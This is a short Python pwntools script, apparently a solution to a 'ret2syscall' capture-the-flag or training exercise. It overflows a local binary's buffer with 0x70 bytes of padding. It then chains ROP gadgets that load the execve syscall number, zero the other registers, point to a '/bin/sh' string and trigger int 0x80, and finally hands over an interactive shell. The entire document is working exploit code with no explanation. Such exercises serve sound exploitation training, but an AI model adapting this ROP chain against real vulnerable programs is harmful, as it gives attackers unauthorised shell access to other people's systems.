from pwn import *

sh = process('./ret2syscall')
eax_ret = 0x080bb196
edx_ecx_ebx_ret = 0x0806eb90
int_0x80 = 0x08049421
bin_sh = 0x080be408
sh.sendline(b'a' * 0x70 + p32(eax_ret) + p32(0xb) + 
           p32(edx_ecx_ebx_ret) + p32(0) + p32(0) + 
           p32(bin_sh) + p32(int_0x80))
sh.interactive()
